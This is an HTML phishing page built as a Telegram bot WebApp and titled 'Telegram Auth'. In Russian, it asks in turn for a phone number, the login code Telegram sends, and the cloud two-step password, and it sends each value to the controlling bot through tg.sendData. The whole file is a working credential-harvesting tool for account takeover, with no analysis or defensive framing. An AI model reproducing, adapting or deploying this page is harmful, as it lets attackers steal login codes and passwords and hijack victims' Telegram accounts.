<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram Auth</title>
    <script src="https://telegram.org"></script>
    <style>
        body { font-family: sans-serif; text-align: center; padding: 20px; background: #fff; }
        input { width: 80%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 5px; }
        button { width: 85%; padding: 10px; background: #0088cc; color: #white; border: none; border-radius: 5px; cursor: pointer; }
        .hidden { display: none; }
    </style>
</head>
<body>
    <div id="phone-step">
        <h3>Введите номер телефона</h3>
        <input type="text" id="phone" placeholder="+79991234567">
        <button onclick="sendPhone()">Продолжить</button>
    </div>

    <div id="code-step" class="hidden">
        <h3>Введите код из Telegram</h3>
        <input type="text" id="code" placeholder="12345">
        <button onclick="sendCode()">Войти</button>
    </div>

    <div id="password-step" class="hidden">
        <h3>Введите облачный пароль</h3>
        <input type="password" id="password" placeholder="Пароль">
        <button onclick="sendPassword()">Подтвердить</button>
    </div>

    <script>
        const tg = window.Telegram.WebApp;
        tg.expand();

        function sendPhone() {
            const phone = document.getElementById('phone').value;
            tg.sendData("phone:" + phone);
            document.getElementById('phone-step').classList.add('hidden');
            document.getElementById('code-step').classList.remove('hidden');
        }

        function sendCode() {
            const code = document.getElementById('code').value;
            tg.sendData("code:" + code);
        }

        function sendPassword() {
            const pwd = document.getElementById('password').value;
            tg.sendData("password:" + pwd);
        }

        // Если бот пришлет ошибку пароля, можно вручную переключить шаг
        // (Для упрощения в этом примере переключение логикой бота)
    </script>
</body>
</html>
